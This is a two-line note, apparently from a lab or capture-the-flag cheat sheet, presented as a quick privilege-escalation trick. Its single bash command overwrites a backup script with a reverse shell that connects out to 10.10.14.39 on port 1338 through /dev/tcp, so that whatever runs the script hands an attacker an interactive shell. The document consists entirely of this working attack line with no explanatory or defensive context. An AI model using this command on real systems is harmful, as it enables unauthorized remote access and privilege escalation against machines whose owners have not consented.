quick method to `echo` a file into a script to privilege escalate
```bash
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.39/1338 0>&1'" > /ftp/backup.sh
```